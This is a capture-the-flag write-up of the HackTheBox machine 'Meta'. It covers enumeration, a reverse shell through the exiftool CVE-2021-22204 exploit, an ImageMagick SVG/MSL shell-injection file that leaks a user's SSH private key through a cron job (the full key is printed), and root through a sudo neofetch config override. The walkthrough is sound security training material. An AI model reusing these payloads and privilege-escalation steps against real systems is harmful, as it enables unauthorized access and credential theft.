# Meta - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Meta.JPG](images/Meta.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22``` and ```80```.

***User***: Found ```dev01.artcorp.htb``` vhost, Using ```CVE-2021-22204-exiftool``` to get RCE to get a shell as ```www-data```, By running ```pspy``` we found ```mogrify``` command running as cron job, And using ```ImageMagick - Shell injection``` we get the SSH private key of ```thomas``` user.

***Root***: By running ```sudo -l``` we found that we can run ```neofetch``` as root, By changing ```XDG_CONFIG_HOME``` and setting our ```neofetch``` config file we get the ```root``` flag.

![pwn.JPG](images/pwn.JPG)


## Meta Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Meta]
└──╼ $ nmap -sV -sC -oA nmap/Meta 10.10.11.140
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-12 00:35 IST
Nmap scan report for 10.10.11.140
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port 80 we get the following web page (Add ```artcorp.htb``` to ```/etc/hosts``` before):

![port80.JPG](images/port80.JPG)

We can see the hint ```The product is already in testing phase.```, By searching for ```vhosts``` we found the following:
```console
┌─[evyatar@parrot]─[/hackthebox/Meta]
└──╼ $ gobuster vhost -u artcorp.htb -w subdomains-top1milion.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://artcorp.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     ../BOlt/subdomains-top1milion.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/03/12 00:49:43 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev01.artcorp.htb (Status: 200) [Size: 247]

```

Let's browse to [http://dev01.artcorp.htb](http://dev01.artcorp.htb):

![dev01.JPG](images/dev01.JPG)

And by clicking on [MetaView](http://dev01.artcorp.htb/metaview/) we get the following web page:

![metaview.JPG](images/metaview.JPG)

By uploading an image we can see the following response:

![metaresponse.JPG](images/metaresponse.JPG)

We can use [CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool) to get a reverse shell.

The vulnerability happens when Exiftool tries to parse the DjVu filetype, more specifically the annotations field in the file structure.

Edit the script ```exploit.py``` with our IP address, run it and we get a reverse shell as ```www-data```:
```console
┌─[evyatar@parrot]─[/hackthebox/Meta/CVE-2021-22204]
└──╼ $ python3 exploit.py 
    1 image files updated
```

And after upload the image ```image.jpg``` we get the shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Meta]
└──╼ $ $nc -lvp 9090
listening on [any] 9090 ...
connect to [10.10.14.14] from artcorp.htb [10.10.11.140] 56992
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls /home
thomas

```

By running [pspy](https://github.com/DominicBreuker/pspy) we can see the following cron jobs which running by ```thomas```:
```console
2022/03/12 16:24:01 CMD: UID=0    PID=1262   | /usr/sbin/cron -f 
2022/03/12 16:24:01 CMD: UID=0    PID=1261   | /usr/sbin/cron -f 
2022/03/12 16:24:01 CMD: UID=0    PID=1260   | /usr/sbin/cron -f 
2022/03/12 16:24:01 CMD: UID=0    PID=1259   | /usr/sbin/CRON -f 
/2022/03/12 16:24:01 CMD: UID=0    PID=1264   | /usr/sbin/CRON -f 
2022/03/12 16:24:01 CMD: UID=0    PID=1266   | /usr/sbin/CRON -f 
2022/03/12 16:24:01 CMD: UID=0    PID=1265   | 
2022/03/12 16:24:01 CMD: UID=0    PID=1270   | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 
2022/03/12 16:24:01 CMD: UID=0    PID=1269   | /usr/sbin/CRON -f 
2022/03/12 16:24:01 CMD: UID=0    PID=1268   | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 
2022/03/12 16:24:01 CMD: UID=1000 PID=1267   | /bin/bash /usr/local/bin/convert_images.sh 
2022/03/12 16:24:01 CMD: UID=1000 PID=1271   | /bin/bash /usr/local/bin/convert_images.sh 
2022/03/12 16:24:01 CMD: UID=0    PID=1272   | cp -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
2022/03/12 16:24:01 CMD: UID=0    PID=1273   | /usr/sbin/CRON -f 
2022/03/12 16:24:01 CMD: UID=0    PID=1274   | /bin/sh -c rm /tmp/* 
2022/03/12 16:24:01 CMD: UID=1000 PID=1275   | /bin/bash /usr/local/bin/convert_images.sh 
```

As we can see, there is a cron job that runs ```/usr/local/bin/convert_images.sh``` which is:
```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /usr/local/bin/convert_images.sh
<onvert_images$ cat /usr/local/bin/convert_images.sh     
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify

```

We can see that it's runs ```mogrify``` process, we can use [ImageMagick - Shell injection](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) by creating the following file on ```/var/www/dev01.artcorp.htb/convert_images/```:
```console
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat poc.svg
<image authenticate='ff" `base64 -w0 /home/thomas/.ssh/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

By running the next cron job we get the following output (from ```pspy```):
```console
2022/03/12 16:59:01 CMD: UID=0    PID=1909   | /usr/sbin/CRON -f 
2022/03/12 16:59:01 CMD: UID=1000 PID=1908   | /usr/local/bin/mogrify -format png poc.svg 
2022/03/12 16:59:01 CMD: UID=1000 PID=1910   | /usr/local/bin/mogrify -format png poc.svg 
2022/03/12 16:59:01 CMD: UID=1000 PID=1913   | sh -c 'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=ff" `base64 -w0 /home/thomas/.ssh/id_rsa`;""  '-sOutputFile=/tmp/magick-7-Dm7BPZwNlWb0gD1I-9xX0-4kZz72CF%d' '-f/tmp/magick-iGq5ANMueD1PC0kssb_03mykDOxV51hb' '-f/tmp/magick-ib0HoVmhb2_zUQshSc7QPs68lAvKV1WG' 
2022/03/12 16:59:01 CMD: UID=1000 PID=1914   | sh -c 'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=ff" `base64 -w0 /home/thomas/.ssh/id_rsa`;""  '-sOutputFile=/tmp/magick-7-Dm7BPZwNlWb0gD1I-9xX0-4kZz72CF%d' '-f/tmp/magick-iGq5ANMueD1PC0kssb_03mykDOxV51hb' '-f/tmp/magick-ib0HoVmhb2_zUQshSc7QPs68lAvKV1WG' 
2022/03/12 16:59:01 CMD: UID=1000 PID=1915   | gs -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 -sDEVICE=pngalpha -dTextAlphaBits=4 -dGraphicsAlphaBits=4 -r72x72 -sPDFPassword=ff LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF0OUlvSTVnSHR6OG9taHNhWjlHeSt3WHlOWlBwNWpKWnZiT0o5NDZPSTRnMmtSUkRIRG01Cng3dXAzejVzL0gveXVqZ2pncm9PT0hoOXpCQnVpWjFKbjFqbHZlUk03SDFWTGJ0WThrL3JOOVBGZS9Na1JzWWRINDVJdlYKcU1nenFtSlBGQWR4bWtEOVdSblZQOU9xRUYwWkVZd1RGdUZQVWxOcTVoU2JOUnVjd1hFWGJXMFdrN3hkWHdlM09KazhodQphamVZODByaXowUzgrQStPeXdjWFpnMEhWRlZsaTQvZkF2UzlJbTRWQ1JtRWZBN2p3Q3VoNnRsNUpNeGZpMzB1enp2a2UwCnl2UzFoOWFzcXZrZlk1K0ZYNEQ5QlJlc2J0OUFYcW00N2FqV2VQa3NXQm9Vd2hoRU5MTi8xcE9nUWFuSzJCUi9TQytZa1AKblhSa09hdkhCeEhjY3VzZnRJdE9RdVMwQUV6YThuZkU1aW9KbVg1TzkrZnY4Q2htbmFweXJ5S0tuNFFSNE1BcXFUcU5JYgo3eE9XVFQ3UW12M3Z3OFREWll6MmRubEFPQ2MrT05XaDhKSlpITzlpOEJYeUhOd0FIOXF5RVNCN05sWDJ6SmFBYklaZ1FzClhrZDdOVFVuak9Rb3NQVElERlNQRDJFS0x0MkIxdjNELzJETXF0c25BQUFGZ09jR3BrWG5CcVpGQUFBQUIzTnphQzF5YzIKRUFBQUdCQUxmU0tDT1lCN2MvS0pvYkdtZlJzdnNGOGpXVDZlWXlXYjJ6aWZlT2ppT0lOcEVVUXh3NXVjZTdxZDgrYlB4Lwo4cm80STRLNkRqaDRmY3dRYm9tZFNaOVk1YjNrVE94OVZTMjdXUEpQNnpmVHhYdnpKRWJHSFIrT1NMMWFqSU02cGlUeFFICmNacEEvVmtaMVQvVHFoQmRHUkdNRXhiaFQxSlRhdVlVbXpVYm5NRnhGMjF0RnBPOFhWOEh0emlaUElibW8zbVBOSzRzOUUKdlBnUGpzc0hGMllOQjFSVlpZdVAzd0wwdlNKdUZRa1poSHdPNDhBcm9lclplU1RNWDR0OUxzODc1SHRNcjB0WWZXcktyNQpIMk9maFYrQS9RVVhyRzdmUUY2cHVPMm8xbmo1TEZnYUZNSVlSRFN6ZjlhVG9FR3B5dGdVZjBndm1KRDUxMFpEbXJ4d2NSCjNITHJIN1NMVGtMa3RBQk0ydkozeE9ZcUNabCtUdmZuNy9Bb1pwMnFjcThpaXArRUVlREFLcWs2alNHKzhUbGswKzBKcjkKNzhQRXcyV005blo1UURnblBqalZvZkNTV1J6dll2QVY4aHpjQUIvYXNoRWdlelpWOXN5V2dHeUdZRUxGNUhlelUxSjR6awpLTEQweUF4VWp3OWhDaTdkZ2RiOXcvOWd6S3JiSndBQUFBTUJBQUVBQUFHQUZsRnd5Q21NUGtadjBvNFozYU1MUFFrU3lFCmlHTEluT2RZYlg2SE9wZEV6MGV4YmZzd3liTHRIdEpRcTZSc251R1lmNVg4VGhOeUFCL2dXOHRmNmYwcllEWnRQU055QmMKZUNuMythdVVYbm5hejFyTSs3N1FDR1hKRlJ4cVZRQ0k3WkZSQjJUWWs0ZVZuMmwwSkdzcWZyQkVOaWlmT2ZJdHEzN3Vsdgprcm9naFNnSzlTRTZqWU5nUHNwOEIyWXJnQ0YrbGFLNmZhODlsZnJDcVBacjBjclNwRnlvcDN3c01jQzRyVmI5bTN1aHdjCkJzZjBCUUFITDdGcDBQcnpXc2MrOUFBMTRBVEs0RFIvZzhKaHdRT0h6WUVvZTE3aXU3L2lMN2d4RHdkbHBLN0NQaFlsTDUKWGo2YkxQQkdtUmtzekZkWExCUFVybEttV3V3TFVZb1N4OHNuM1pTbnk0amo4eDBLb0VnSHF6S1ZoNGhMMGNjSldFOHhXUwpzTGsxL0cyeDFGeFU0NStoaG1tZEczZUt6YVJoWnBjM2h6WVpYWkM5eXBqc0ZEQXlHMUFSQzY3OXZIbnpUSTEzaWQyOWRHCm43Sm9QVndGdi85N1VZRzJXS2V4bzZET01tYk51eGFLa3BldGZzcXNMQW5xTGYwMjZVZUQxUEpZeTQ2a3Z2YTFheEFBQUEKd1FDV01JZG55UGprNTVNanozL0FLVU5CeVN2TDVwc1dzTHB4M0RhV1oxWHdIMHVEeldxdE1XT3FZamVua3lPckkxWThheQpKZllBbTR4a1NtT1R1RUl2Y1hpNnhrUy9oNjdSL0dUMzh6RmFHbkNIaDEzL3pXMGNaRG53NVpOYlo2MFZmdWVUY1VuOVkzCjhaZFdLdFZVQnN2YjIzTXUrd015djg3L0p1K0dQdVh3VWk2bU9jTXkraU9Cb0ZDTFlrS2FMSnpVRm5nT2c3NjY0ZFVhZ3gKSThxTXBENlNRaGtEOE5XZ2N3VTFEakZmVVVkdlJ2NVRuYU9obWROaEgyam5yNUhhVUFBQURCQU4xNnEyd2FqclJINTl2dwpvMlBGZGRYVElHTFpqM0hYbjlVNVc4NEFJZXR3eE1GczI3enZuTllGVGQ4WXFTd0JRelhUbml3SWQ0S09FbXg3cm5FQ29UCnFtdFNzcXp4aUtNTGFya1ZKKzRhVkVMQ1J1dGFKUGhwUkMxbk9MOUhES3lzRFRsV05TcjhmcTJMaVl3SWt1N2NhRm9zRk0KTjU0enhHUm81TndiWU9BeGdGaFJKaDlEVG1oRkhKeFNueC82aGlDV25lUktwRzRSQ3I4MGZGSk12YlRvZDkxOWVYRDBHUwoxeHNCUWRpZXFpSjY2Tk9hbGY2dVE2U1RSeHU2QTNid0FBQU1FQTFIamV0ZHkrWmYweFpUa3FtbkY0eU9EcXBBSU1HOVVtCmozVGNqczQ5dXNHbEhiWmI1eWh5U251Y0pVMHZHcFJpS0JNcVBleXNhcUdDNDdKdS9xU2x5SG5VejJ5UlB1K2t2akZ3MTkKa2VBbWxNTmV1TXFnQk8wZ3Vza21VMjVHWDRPNVVtdC9JSHFGSHc5OW1jVEdjL3ZlRVdJYjhQVU5WOHAvc05hV1Vja0V1OQpNNG9mRFEzY3NxaHJOTGx2QTY4UVJQTWFaOWJGZ1lqaEIxQTFwR3hPbXU5RG8rTE51MHFyMi9HQmNDdllZMmtJNEdGSU5lCmJoRkVyQWVvbmNFM3ZKQUFBQUNYSnZiM1JBYldWMFlRRT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg== 
2022/03/12 16:59:01 CMD: UID=1000 PID=1916   | pkill mogrify 

```

And the SSH private key of ```thomas``` user is:
```console
-----BEGIN OPENSSH PRIVATE KEY-----
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
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----
```

And using ```thomas``` SSH private key we get a shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Meta]
└──╼ $ ssh -i id_rsa thomas@10.10.11.140
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
thomas@meta:~$ ls /home
thomas
thomas@meta:~$ cat user.txt
cf85bf4cdd2f2e0f8952885d35e17f6b
thomas@meta:~$ 
```

And we get the user flag ```cf85bf4cdd2f2e0f8952885d35e17f6b```.

### Root

By running ```sudo -l``` we can see the following:
```console
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"

```

Meaning that we can run ```neofetch``` command as root, and we can see also ```XDG_CONFIG_HOME``` which defines the base directory relative to which user-specific configuration files should be stored,  If ```$XDG_CONFIG_HOME``` is either not set or empty, a default equal to ```$HOME/.config``` should be used which is ```/root/.config```.

Let's create directory on ```/tmp``` called ```neofetch``` which contains modify ```config.conf``` file of ```neofetch``` command.

We can find it on ```/home/thomas/.config/neofetch/config.conf```:
```console
thomas@meta:/tmp$ cat /home/thomas/.config/neofetch/config.conf
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
print_info() {
    info title
    info underline

    info "OS" distro
    info "Host" model
    info "Kernel" kernel
    info "Uptime" uptime
    info "Packages" packages
    info "Shell" shell
    info "Resolution" resolution
    info "DE" de
    info "WM" wm
    info "WM Theme" wm_theme
    info "Theme" theme
    info "Icons" icons
    info "Terminal" term
    info "Terminal Font" term_font
    info "CPU" cpu
    info "GPU" gpu
    info "Memory" memory

    # info "GPU Driver" gpu_driver  # Linux/macOS only
    # info "CPU Usage" cpu_usage
    # info "Disk" disk
    # info "Battery" battery
    # info "Font" font
    # info "Song" song
    # [[ $player ]] && prin "Music Player" "$player"
    # info "Local IP" local_ip
    # info "Public IP" public_ip
    # info "Users" users
    # info "Locale" locale  # This only works on glibc systems.

    info cols
}


# Kernel


# Shorten the output of the kernel function.
#
# Default:  'on'
# Values:   'on', 'off'
# Flag:     --kernel_shorthand
# Supports: Everything except *BSDs (except PacBSD and PC-BSD)
#
# Example:
# on:  '4.8.9-1-ARCH'
# off: 'Linux 4.8.9-1-ARCH'
kernel_shorthand="on"
....

```

By creating a new file on ```/tmp/neofetch``` and changing ```XDG_CONFIG_HOME``` we can make the command to search for the config file on ```/tmp/neofetch```.

Let's add ```whoami``` command to ```config.conf``` file:
```console
thomas@meta:/tmp$ cat neofetch/config.conf | head -n 10
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
print_info() {
    whoami
    info title
    info underline

    info "OS" distro
    info "Host" model
    info "Kernel" kernel

```

Now, let's run the command:
```console
thomas@meta:/tmp$ sudo XDG_CONFIG_HOME=/tmp /usr/bin/neofetch
root   _,met$$$$$gg.
    ,g$$$$$$$$$$$$$$$P.       root@meta 
  ,g$$P"     """Y$$.".        --------- 
 ,$$P'              `$$$.     OS: Debian GNU/Linux 10 (buster) x86_64 
',$$P       ,ggs.     `$$b:   Host: VMware Virtual Platform None 
`d$$'     ,$P"'   .    $$$    Kernel: 4.19.0-17-amd64 
 $$P      d$'     ,    $$P    Uptime: 8 mins 
 $$:      $$.   -    ,d$$'    Packages: 495 (dpkg) 
 $$;      Y$b._   _,d$P'      Shell: bash 5.0.3 
 Y$$.    `.`"Y$$$$P"'         CPU: AMD EPYC 7401P 24- (2) @ 2.000GHz 
 `$$b      "-.__              GPU: VMware SVGA II Adapter 
  `Y$$                        Memory: 101MiB / 1994MiB 
   `Y$$.
     `$$b.                                            
       `Y$$b.
          `"Y$b._
              `"""


thomas@meta:/tmp$ 

```

And we can see that we are running the command as ```root``` with our configuration file.

Let's print the ```root``` flag:
```console
thomas@meta:/tmp$ cat neofetch/config.conf | head -n 10
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
print_info() {
    cat /root/root.txt
    info title
    info underline

    info "OS" distro
    info "Host" model
    info "Kernel" kernel

```

Run it:
```console
thomas@meta:/tmp$ sudo XDG_CONFIG_HOME=/tmp /usr/bin/neofetch
8b6a32fd8a8cdddd570eb5fa32160464
    ,g$$$$$$$$$$$$$$$P.       root@meta 
  ,g$$P"     """Y$$.".        --------- 
 ,$$P'              `$$$.     OS: Debian GNU/Linux 10 (buster) x86_64 
',$$P       ,ggs.     `$$b:   Host: VMware Virtual Platform None 
`d$$'     ,$P"'   .    $$$    Kernel: 4.19.0-17-amd64 
 $$P      d$'     ,    $$P    Uptime: 11 mins 
 $$:      $$.   -    ,d$$'    Packages: 495 (dpkg) 
 $$;      Y$b._   _,d$P'      Shell: bash 5.0.3 
 Y$$.    `.`"Y$$$$P"'         CPU: AMD EPYC 7401P 24- (2) @ 2.000GHz 
 `$$b      "-.__              GPU: VMware SVGA II Adapter 
  `Y$$                        Memory: 101MiB / 1994MiB 
   `Y$$.
     `$$b.                                            
       `Y$$b.
          `"Y$b._
              `"""


```

And we get the root flag ```8b6a32fd8a8cdddd570eb5fa32160464```.
